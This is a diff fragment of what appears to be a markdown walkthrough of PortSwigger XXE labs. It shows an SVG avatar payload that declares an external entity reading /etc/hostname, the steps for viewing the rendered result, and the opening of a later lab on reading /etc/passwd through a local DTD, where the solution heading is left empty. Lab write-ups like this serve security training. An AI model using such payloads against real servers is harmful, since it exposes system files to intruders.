@@ -194,3 +194,23 @@ To solve the lab, upload an image that displays the contents of the /etc/hostnam
       <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
 
 * Save it with .svg and upload it as avatar in the comment box.
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d045da79-a7d1-4480-a842-d2abc811f43b)
+
+* View the page source and click the image to see in your comment.
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/76ea36fe-9840-4ea8-83fe-5afd82df5f2c)
+
+![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/a385dc46-9636-4aa6-b96e-603581572e29)
+
+Submit the code in the answer box and lab is solved.
+
+## Lab 9: Exploiting XXE to retrieve data by repurposing a local DTD
+
+This lab has a "Check stock" feature that parses XML input but does not display the result.
+
+To solve the lab, trigger an error message containing the contents of the /etc/passwd file.
+
+You'll need to reference an existing DTD file on the server and redefine an entity from it.
+
+### Sol :
